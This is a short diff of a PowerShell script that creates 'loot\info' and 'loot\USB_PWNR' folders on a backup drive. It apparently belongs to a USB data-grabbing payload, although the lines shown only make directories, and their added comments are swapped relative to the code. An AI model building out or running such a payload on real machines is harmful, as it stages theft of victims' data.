@@ -18,8 +18,14 @@ if(!(Test-Path -Path $TARGETDIR )){
     New-Item -ItemType directory -Path $TARGETDIR
 }
 
-#See if a info folder exist in loot folder. If not create one
+#See if a USB_PWNR folder exist in loot folder. If not create one
 $TARGETDIR = $backupDrive + "\loot\info"
+if(!(Test-Path -Path $TARGETDIR )){
+    New-Item -ItemType directory -Path $TARGETDIR
+}
+
+#See if a info folder exist in loot folder. If not create one
+$TARGETDIR = $backupDrive + "\loot\USB_PWNR"
 if(!(Test-Path -Path $TARGETDIR )){
     New-Item -ItemType directory -Path $TARGETDIR
 }
